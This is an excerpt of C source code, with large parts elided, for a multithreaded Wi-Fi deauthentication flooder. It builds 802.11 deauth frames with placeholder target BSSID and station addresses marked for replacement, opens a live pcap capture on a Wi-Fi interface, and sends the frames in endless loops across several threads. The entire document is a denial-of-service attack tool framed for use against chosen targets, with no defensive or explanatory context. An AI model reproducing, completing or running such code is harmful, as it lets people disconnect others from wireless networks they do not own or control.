...
// Function to create the deauthentication packet
void create_deauth_packet(struct deauth_pkt *packet, uint8_t *bssid, uint8_t *station) {
    ...
    memset(packet->hdr.addr1, 0xff, 6); // Broadcast address
    memcpy(packet->hdr.addr2, station, 6); // Station MAC address
    memcpy(packet->hdr.addr3, bssid, 6); // BSSID
    packet->reason_code[0] = 0x01; // Reason: unspecified
...
DWORD WINAPI send_deauth(LPVOID param) {
    ...
    uint8_t bssid[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55}; // Replace with target BSSID
    uint8_t station[6] = {0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb}; // Replace with station MAC
    ...
    while (1) {
        ...
        Sleep(100); // Sleep 100ms to avoid overloading
    }
    return 0;
}
...
int main(int argc, char *argv[]) {
    ...
    pcap_t *handle = pcap_open_live("Wi-Fi", 65536, 1, 1000, errbuf); // Replace "Wi-Fi" with your interface
    if (handle == NULL) {
    ...
    for (int i = 0; i < threads; i++) {
        thread_handles[i] = CreateThread(NULL, 0, send_deauth, (void *)handle, 0, NULL);
